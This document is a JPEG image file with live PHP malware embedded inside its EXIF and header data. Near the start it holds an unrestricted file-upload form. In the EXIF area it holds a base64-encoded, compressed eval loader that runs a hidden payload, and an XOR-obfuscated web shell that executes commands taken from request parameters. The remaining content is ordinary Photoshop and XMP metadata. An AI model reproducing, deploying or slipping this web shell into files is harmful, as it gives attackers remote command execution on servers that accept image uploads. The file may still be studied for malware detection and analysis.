����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<!DOCTYPE html>
<html>
<head>
  <title>Real Shit</title>
</head>
<body>
  <form enctype="multipart/form-data" action="" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��ÿØÿà JFIF  H H  ÿá Exif  MM *          	
      	      	             	      	$(       1   5  	,2      
b;      
zGF       GI     c  ‚˜      
€‡i      
†œ›    
  ¦œœ    
  °œ    
  ºœž    
  ÄœŸ    
  Îê      þ  Øê   <?=eval("?>".base64_decode("PD9waHANCiRvT28gPSAiXHg3M1x4NzRceDcyXHg3Mlx4NjVceDc2IjsNCiRvT08gPSAiXHg2N1x4N2FceDc1XHg2ZVx4NjNceDZmXHg2ZFx4NzBceDcyXHg2NVx4NzNceDczIjsNCiRvMG8gPSAiXHgzZlx4M2UiOw0KJG8wTyA9ICJceDY3XHg3YVx4NjlceDZlXHg2Nlx4NmNceDYxXHg3NFx4NjUiOw0KJG8wMCA9ICJceDYzXHg2Zlx4NmVceDc2XHg2NVx4NzJceDc0XHg1Zlx4NzVceDc1XHg2NFx4NjVceDYzXHg2Zlx4NjRceDY1IjsNCiRPT08gPSAiXHg2OFx4NjVceDc4XHgzMlx4NjJceDY5XHg2ZSI7DQokTzBPID0gIjAxZDMwODJjZjc4ZmRlZWVmNDAzZmMwNzQ5ZWQwNTcxMWFhNWZhZDE1YmZiMzlmZGNhYmZjYTk2ZjhlYjc4NjAyOTAxNjMyYTQ1Mjk4NDcyYjZjZDYxYWM5NWUzNjI4MjdkYTA4MDFjYWZmYzNlZTU0ZWZmZmM1ZjZhMWNkNTlhYWQ0MWRkMWViYzdlNGZmNzA5MzIyMzI1NTQyM2EzMTk0MzdlMzM0MTFiZWEwYWViZWM1YzQ0ZWRhNGJlZjFkNjc2N2M0ZTM3NDg4YmE1YTNmMmUzZjJkZWQzZGIzZDZkZWNlZDRjN2I3Y2ZlY2Y2NWYzNWNlZTMyZWZhZjU3YjAzMDAxZmY2ZjE2NDkyNjY4MWFkMzEyN2M1Yzc5ZGQzMzg3YjFiN2UxZGY0MzVmOTAzM2I3Y2ZjNDZmNTQ5Nzg1OTkzZTIyZGNhNDYyM2QzODFkM2NjOWI4NTA5OTJmYWU2MTVhM2FkMGJlOTY5ZGI3NDAyOGJjMGVjYzkyNDNiZjg4OGYwZDYzYWZkMzkwNzExMTc3ZDk1MTkzZjhlNWUyN2E2MTViOTkyNGVhZmRiYmU5MDU2NDA0YTg0NWY4M2NkMjkwNmVhNWNkZTEzNzUwYjRjMjc3MWE3MzE3ZDY1ZjNkNmNlODc2ZWZkOTljZDEzOTQyNGZmYWMyY2FlZWU4MjI0YjQxMDk2YWRjMmRiNmNkNDlmNzVkNjU3OTJjMjUwZTA1NzEyYTIzMTI0NTU2ZmIxNTUyMjQ4NzI2ZmVkYjMzMDM1OGZkYjk0ZmUwZThkNDc5YmI4YzQzNDM4MGRkM2ViYjM5NzIxMDllNzMyMTI5MGQ1MmFiODVkMTVkM2M2N2U2NWM3M2E2M2YxNzc4MzQwMGJlMmZjMzMyNWM0YjQ3ZTQ4OWQ4ZTBiODg4Yzc0MmMzMzdlNmRkNjRiMTQyMjQ5MGZiNzE3YmU0NmNmMTE4NTAyMzYwYzlhNGQ5ZDE3YTE0MjQ0NWI3MjVmYTFhM2MxMDI2NGY4ZjU4NGQ0YmYwNjZhYWM1ODhmOTZjNDEwOTQ3MWMwYmRiNTFlOTMzNTJiOTg3NTIyZmQwNmUwMDljYTkwYTNkMzBkYTVhMGQ3MmNhNzk3OGI1ZTkyN2E3OGU4ZGQzM2NiZjlmM2YyZDE4Y2E3ODA0NjU3YzJkMDE2NzYwYjYzZjBkYzM4NDhlMWFiODJhOWJjNDdkMDM4ZTgzODYxOTRiMjg0YTRmMjMxMDM0NDllYWYzODlkY2FhNzA4OGE5ZWM3NmZlOThiMDY5NTZkN2RjMTEyMjg1N2M1MDg5YWUzYTI4ZTZhNmI2NGVjMzc4ZWFiNTIxOWU1ZGYxNjY2ZjI2M2RkNGU0N2Q0MmY2ZTViM2JiMDcyMDExZGNmMzk5N2ZjNGExZmQ4YTA5MTI2M2JhNGFjY2I0Y2RhZWYwMTc3ZmRhZTFmMTBiNWE3YTUzZGVhOTQzZDVjYTc2OGZhYmFjZDU3MzMyN2M0OTQyMGFhODY0YzFjZjdmMGRmOWZiZjIwNWFkNTViN2QwYjEzNzQ5Y2U4ODdhODcyNjYyN2RlNjkzNWY2YzQ4ZmE4MjA5MGY1NjdkYjQ4NmJlMDEyZTBmMzkwNDk5MDVhZjYyODg3NDkyMWZhMmFhNzNmNTE2OTRlOTk3ZDA0OGFmMWE0MmY5OTA3ZjdmNTcwMDRjYzBmMWIzYWU5YWZmMDU1YjkyZTY4ZDliZTNhYWQ3ODUwYzQ3OWQwMzEwMjdkMTBjMzQ5ZDI1NzMxY2U3MWZlNTc1MGU5MWQyMjY0ZjgxNjdhZDNkYWJmMDYzNmY0ZmU1Y2Y1NzA5MTgyZTRkMTU1NDZmMjU0MzQyODM4NTQ4NjU5ZDI1M2U1ZTI4YjFmNjI0NDU5MTk3YmRmYzA1MWI4YTcxYzZmNWFiNjM5MGY1OTA2MGZkYjVkYTE2ODM1Mzc4MWRlYTY3ODlhNDQ1N2ZjZWQxN2NlZWRiMWFhYzc4YzMyNjNhNWRiNGU4YzQyODM2NDI4NzlmYzBiZjc4ZmJlNzg3YjgwYTg0NTdmNTBiMjgxZjJiMGUwZWU4N2JjY2UyN2EyYWU2NmZjNjRjNTQzY2E4YjNjMTMwZTJhMThjN2Y4MTgzNDdlOTdlN2ZiYzVhYjRmZTA5YzNkMTE3NDhhNzQ3M2VhMzgxMTcwYThjNGY2M2UxZWVjZjZlYWU5ZjZlOGE0NDliNjE3MTc5MTFhMzc2NDlhZmJiYzVlYTdlY2U3OTUwZmM3MTFmNzM2YTNiZjgyYTg4YmJhYmRjY2Q0N2RlNWNkNjVlMThjNTk2YzJmZGVlOWExNmY1NzhmMjU1ZTE3OGMwYjE3ZjVjNDJlMjhiMWJmZDZmY2MwZGQxMWZmNzY5MjQwZjE1YjViNWZjMTEwMGNjYTg5ZjBhZDdjYjYzNmU1MGQ5NDgyYTEwMmRhYjhmNmJhZmM0YWNiYThhMjM1NWE2MzEyZjgyYmJhZDlmN2E3ZDZiYmMzZGJkNmMzMjM1MjA2NzNhYzVhM2YzNmQ5MWI3ODg2NjVjNzJmYjM2YWVjZmM4ZjQ3NjVhMzA0YjJhYTYxOWM5ZGFhMTU1ZTY2Y2M5ZmMzODRlNWQ1OTM0YWZhYzM2ZGMxZTY1YjU3YmU2YTAyNmZlMDVhYTYyMWYyNGQxMjg4NjA2YjZhZmFhZDM3ZThiYThhZmMyYTZmMjc1YTZmZTRjODZmZDRlZDE0MjgwMGMzZWNjNTA1MDY5ZmY5MGEwMGJkODRlN2U1NWY2NmIxZmRmOTdhY2Y0ZTFlNjFlYWRhNTUwYWU2MThmYWIxMTBhMmMxYmUxN2FkYTc4M2MzY2I1OTA1M2M2MjI2ZTFlZjZkYWRkNjI4OTExMTBiYzE2MjI1ODcxMmRlZWE0N2U4YjljOWNiNTI3YzNlODg2NmQ1ZWY1NTU0OTRlM2ExNzhkOTQ0NjdmNjkxMmE1ZWZiNjRmMTM4ZGU1ZDFmOGJlNDk5OWYwZTJlYmYyOThhYjY0YzZkOTAxNmZkN2YwN2RlMjBlMjM4MjUzNTQ3NjliY2NkNDUzMmZlZDZlZmEwYTU4MTcyYWMyMzY4YTlkODMxMGEyN2U1NDFiZTk1MDFiMzQxNWE3NDMxNDJhNDljODNmMDUyMzBkNTdmMDAxMzBiYjNhNTQ3OTVhZjg2MzliNmQ2NWZjMDNmNTQ5MDgzMDllNGI4MmE4YWVjNDY2OWYyYTM0ODc3M2JmZWMzMjY0YmVlZGZlNDQxYzNkZjJjNDc4OGYxOTBmZTA1NDhhYTIzYjEyOWMxZTdkNzk3MTk1NmZhMjJlMmJjOWZhN2QwZjhmNmYzMjMzMmUzZGUxM2NhOTZlZjExZTE4ZTA0M2JmNzIyOWFlNmZhZGZkY2IxNjUxYWI1OGZlNjA5OTU1MWJlZjBiY2Y4ZDY2MzRmN2ZhNzZjN2E4YjE4NzE4Y2JkNGM1ZjQ1Y2UxNTNjN2IwODdiMDViM2NiZDI3YTEzYzlhZjk4NGFhZGEyZTdjMDZiMGYzN2YwNTExZGM0ZWRkY2ViNDUzZTQ3M2MwYjA0ZWE0MTk2ZTJjN2Q2NDNjOWUwODhjOWZkZjczYWVjZjcxYzRiMzI5NzdhZDdhZmI4ZmQ2ZDZhM2ZiOTI5YmE3Yjc5MjNmODM3N2I3ODkwZjBkOWVkNWI0Y2Y4NGU0NzRmNzY5YjdmN2JmNTg3NDkzZTA4YjgwNjMyYTkwZDEzZThkYzVjY2ZjNzE4MWQ3MzdiMGY0ZGY5ZjRlYjg4MGM1NmFmZTAzOTUzZmUwZDE0Y2QzZWVmOTYxNzNjYTM0Y2E0MjYzZWI0N2QyYThmYzM4NGMxOWUzYjRjZDRmMmRkOTE1M2RlZGM1YmVhNGFhZTczOWQwM2ZjZTI5MDA4ZmNmZTAxMzdhMGFjZDVhM2UyNmE0ZTIwNGFkMzc5MTQ2NmViYTcyMjdjOTI3ZDYwZDdmOWNkMGM1MDEzYTZmYzRmMWEzMjM4ZmI0NDA5ZTQyMjcxNmQ2NDIwZGI5OGEzZjgxYmE0MDY4MjQxNzY2YjhkN2Y3MGE5N2YxNzE2ZGVhZjZjNWU5MGQ0ODBlOTg3YjZkZGQ2ZTlmMmZiN2Q0OThjMmEwNWZiODY3ODFhYzg5MGM2NzJkNGJmMDBiZjgwYjIyMTVjNjc3ODNmZWE1MTExNzhlYjEwNGVlNzUwZmIyYzIzMzhlYjQ5ZjAxMDEzNTc2NjBmOTA1YWI0NmRmMDhkNTVmNTZlMDE2YmYwNmNmZjQ5MzVkMzM1MjNmZTZlMzgzZjdhNDQwZTBjMzczZGEzNjVmZTMwNmQ3NzAxMzQyM2Y2N2Q0NDc3NjcxNTBjNzU2NjQ4NDY3MTQ1OWE1MTA4ZjkyYWI0YWVmZWYxYjMwNjdkYTU2M2Y4MmUzODk3NjExOTBhYjU4YzU0OGMyMTg0ZWJhNWUwOGI1ZmE2YmQ2NWYyNzEwODFlZmQ3NDk4ZWRlMGNhZDVjMTA0YTI4ZjY0MzMxZmM5YjdiYjFkYmYwNGFjZmJmODA3ZDM4Yjc2YWQ1MjA5NDk4ZjAxNjYzNWU0OGE4ZWQ4YjRlYTllNmY4ZTI0NjQ2MTkyNmUzY2Q4OTc4NGQ0OGM0MjlhNTdiYmQ1ZDI5YjkyNjc3OGI1ZmI0MjM1ZmMwYmMyYjBlNzg4NWQ0MTMyMTBjZTRlYWYzZjQ0YTdkNDQ1Y2Y5MTM3Y2FhZWFlZTVhMGM4YTMxMzBiMmY1YjJiNjcxZjI0YmQxOGI0MzhlMTU1MmVhMzU1ZmJjYmY4M2M0ZjdlYTYwNjExMzkyNDVlNWNmZDkxYWM2Nzg4NGJkMDg2OWM5MmUyNmJjOGM5OGU5ZTA1YTIzOWViOGJiZTQ4MTBiZmRiYzUzZDk2ZTg2ZGJlZmFjYjNmMmJmODFlMDVkM2NlODk5ZGU1ODY5MjIzMDgzNzQ5MWY4ZTVjYzc1OTAyYWIzMzllNzBhN2MyNTlhMjk1Yjk5ZTUxNmVlNTJhNjIzZWUzNWU5NGYyNjc1NDJmYzBlZjZmN2YxOTg4MmU5ODJiZDUxNDFiZTM0ZmE5YmU5NjdmYmJmNDZkOTZhODM5MGQ4YjEzYzUxYjYwY2QzMTI0Y2Q3YmE2NWU5Yzk5MjBkNWJiOTM1MzI0MTFmZmJlM2ZkM2Y4MGY0YjljNDNjMDJhMTRlYjAxNjcxYjg4YTgwMDVkMmVjOWUyOTFjMjExNzBhNTQ2ODg4NzBiZWFhNDE2ZDdhODhlYWIxNzk5YmQzOGM0NTRlOGQ4NzdkMWEyZGZjMTRjZTY4MzAwNWM1MzNlYjZkOWEzMjc0MzA4YjVmMDgzZjBkNThmNTU0YTc4NjFiNDI4NzVjMDk5MjMxYTM5MWU1MGE3NzI4OGUwODlhNzdlYjA2NzA2OTgwZmUwMDU4NzYyZGYwYjM0MTg4YzY4MGNiZDdhMTQ2ODc1MThiYTgwNzcxNmIxNTNlNmZlNzYzNzAzYjMzZDhmMjYxMDhlNTNkNDhkMjRjZDdlMTY5MTRkNDJmNjU0OWZjMDdkNGVkNWI2ZTBmNzA4N2E2YjExZDA5OTc2NjdiZTA4OGFjYTI2ZDJkMzBmMTQ1NzcxODRjZmMyZjk0NmRjZDMwN2QwMTk1ZDI0OTZmMmE2NmUxZWM0NDkyYTFmYzE4ZjVkZWMzNzY2NDQ1NzYwZTZkZTViY2ZlZDVhNDEzYmVkODkyNjBiZmJmYmE0ZmUyMmFhN2E4MWRmYTJiM2NjYzRhYmZiZDk0MjMxNTM0NzljMTYzODYyOGRkZGZjMWFkNzBiNzZhYTRkMDBhN2RjZWZkYjBhZjVjY2VkNzE4NzhjZGE3YzA3Nzc3ZTVmMzRmOGE1N2M0NzM0NDdkMWQxMTk3ZDY2NTYxZDQ3YjA3MjRiNTFiZjFlMGFmZWU1N2NmZGVjNzI5M2I5ZTk2ZjczNWZiN2NlNTczZWIwZjcwZjNkZmNmN2ZiZTlmNGViYWE2NjA4ZGViMTQ3ZjljY2M0NzhiMjU5OThiMDJjYjE2MTY1ZmZmNDQxNDQwZTNiMWQ1OTYxNTljNzgiOw0KZXZhbCgkbzBvLiR7Ilx4NmZceDRmXHg0ZiJ9KCRvT28oJHsiXHg2Zlx4MzBceDRmIn0oJG9PbygkeyJceDZmXHgzMFx4MzAifSgkb09vKCR7Ilx4NmZceDRmXHg0ZiJ9KCRvT28oJHsiXHg2Zlx4MzBceDRmIn0oJE9PTygkeyJceDRmXHgzMFx4NGYifSkpKSkpKSkpKSkpOyBfX2hhbHRfY29tcGlsZXIoKTsNCj8+DQo="));?>

?><?="<br>";?>dnthirteen@h34rtbl33d.today:~$ <?="<".("{"^"+").("{"^")").("{"^">").">";@$_++;$__ = ${("|"^"#").("{"^"<").("{"^">;").("{"^"/")}[!$_];$___ = `$__` ?: $__(${("|"^"#").("{"^"<").("{"^">;").("{"^"/")}[$_]);?><?=($___."</".("{"^"+").("{"^")").("{"^">").">");__HALT_COMPILER();?>1337:13:37 13:37:666ÿÿ
  1337:13:37 13:37:666ÿÿ
 null  null   ˆ"       ˆ'    š       null      |      ’       ’       ’	     _  ’‘    04  ’’    04       ÿÿ          
        
¤        ¤    š  ¤       ¤	       ¤
       ê     p    ê                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         1997:12:11 15:28:59 1997:12:11 15:28:59   n u l l   n u l l   n u l l   n u l l   n u l l                 &      .(             6      Â       H      H   ÿØÿÛ C 		

 $.' ",#(7),01444'9=82<.342ÿÛ C			

2!!22222222222222222222222222222222222222222222222222ÿÀ  
 
! ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? Ñ×|AâDÔõ%·†Ö}Ibm>ec.Ý |¥F¯ß wlWdÞ+½…ŒSxcRóPí-Ñ—#®á‘èp(×À’ÿ Ä×N7\Ù<e˜òöùnv«ŸlW¦ZÙ@O$Æ¹?… ÿÙÿíjPhotoshop 3.0 8BIM%                     8BIMí      H     H    8BIM&               ?€  8BIM
        x8BIM        8BIMó     	         8BIM
       8BIM'     
        8BIMõ     H /ff  lff       /ff  ¡™š       2    Z         5    -        8BIMø     p  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè  8BIM       8BIM         8BIM          @  @    8BIM         8BIM    I              
   
   
 U n t i t l e d - 1                                 
   
                                            null      boundsObjc         Rct1       Top long        Leftlong        Btomlong   
    Rghtlong   
   slicesVlLs   Objc        slice      sliceIDlong       groupIDlong       originenum   ESliceOrigin   
autoGenerated    Typeenum   
ESliceType    Img    boundsObjc         Rct1       Top long        Leftlong        Btomlong   
    Rghtlong   
   urlTEXT         nullTEXT         MsgeTEXT        altTagTEXT        cellTextIsHTMLbool   cellTextTEXT        	horzAlignenum   ESliceHorzAlign   default   	vertAlignenum   ESliceVertAlign   default   bgColorTypeenum   ESliceBGColorType    None   	topOutsetlong       
leftOutsetlong       bottomOutsetlong       rightOutsetlong     8BIM      8BIM        8BIM          
   
      @    ÿØÿà JFIF  H H  ÿí Adobe_CM ÿî Adobe d€   ÿÛ „ 			



ÿÀ  
 
" ÿÝ  ÿÄ?          	
         	
 3 !1AQa"q2‘¡±B#$RÁb34r‚ÑC%’Sðáñcs5¢²ƒ&D“TdEÂ£t6ÒUâeò³„ÃÓuãóF'”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö7GWgw‡—§·Ç×ç÷ 5 !1AQaq"2‘¡±B#ÁRÑð3$bár‚’CScs4ñ%¢²ƒ&5ÂÒD“T£dEU6teâò³„ÃÓuãóF”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö'7GWgw‡—§·ÇÿÚ   ? ·ÕºÇ_nf^+jf=½@TîŸMq·nÖ´ún©»j}Ò^Ú¿ÂÙé®“ö·Vÿ Ê—ý/Cùæ=ãÿ „ÿ î×þ ¹Î»ÿ .ž>“?œþ—ô¿õŸÿ Ý•Õýýë©)ÿÙ 8BIM!     U       A d o b e   P h o t o s h o p    A d o b e   P h o t o s h o p   7 . 0    8BIM        ÿáßhttp://ns.adobe.com/xap/1.0/ <?xpacket begin='ï»¿' id='W5M0MpCehiHzreSzNTczkc9d'?>
<?adobe-xap-filters esc="CR"?>
<x:xapmeta xmlns:x="adobe:ns:meta/" x:xaptk="XMP toolkit 2.8.2-33, framework 1.5">
	<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:iX="http://ns.adobe.com/iX/1.0/">
		<rdf:Description about="" xmlns:xapMM="http://ns.adobe.com/xap/1.0/mm/">
			<xapMM:DocumentID>adobe:docid:photoshop:e4e9b767-808f-11ea-b398-e7491f16d242</xapMM:DocumentID>
		</rdf:Description>
		<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"/><rdf:Description xmlns:MicrosoftPhoto="http://ns.microsoft.com/photo/1.0/"><MicrosoftPhoto:CameraSerialNumber>null</MicrosoftPhoto:CameraSerialNumber><MicrosoftPhoto:DateAcquired>2013-12-11T15:29:16.570</MicrosoftPhoto:DateAcquired><MicrosoftPhoto:FlashManufacturer>null</MicrosoftPhoto:FlashManufacturer><MicrosoftPhoto:FlashModel>null</MicrosoftPhoto:FlashModel><MicrosoftPhoto:LensManufacturer>null</MicrosoftPhoto:LensManufacturer><MicrosoftPhoto:LensModel>null</MicrosoftPhoto:LensModel><MicrosoftPhoto:Rating>99</MicrosoftPhoto:Rating><MicrosoftPhoto:LastKeywordXMP><rdf:Bag xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Bag>
			</MicrosoftPhoto:LastKeywordXMP></rdf:Description><rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator><rdf:Seq xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Seq>
			</dc:creator><dc:rights><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:rights><dc:subject><rdf:Bag xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Bag>
			</dc:subject><dc:title><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:title><dc:description><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:description></rdf:Description><rdf:Description xmlns:xmp="http://ns.adobe.com/xap/1.0/"><xmp:CreateDate>1997-12-11T15:28:59.039</xmp:CreateDate><xmp:Rating>5</xmp:Rating></rdf:Description></rdf:RDF>
</x:xapmeta>
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                            <?xpacket end='w'?>ÿÛ C ÿÛ CÿÀ  
 
" ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? úö²ý°¿o­3âÿ í
ð§Kð'¾xÃö³µø=¬~È¿~!xóÆšÇÆc Ïà¿iWËàýoÁ>¼Ñü
â_„³Ú\üp×´?Mâ(á:ñV·à™µ_ëÚ=ü5û;wû~|WðåÕÏ‡¼Wÿ îýª¥ñFƒq6âI|â?ƒ~(ðtºþ—#XëxOÄ×>5Ð.<Eá§Ô`¸m]ŸBÑfÕô³k¨K¤éÏpÖpþ?~ØpÃ©|Jÿ ‚–|HÔbŽÿ â'ìóâïÙ¾/€>=½n¼ið6/øª)|IÁïÎ$×>Çân.$×ÁwÚ"êÒO3ß‹†•ËN?ííî>øyà†yçðw†fši¢I%šY4K’Ydug’I‹»¹,ÌK1$“@ÿÙ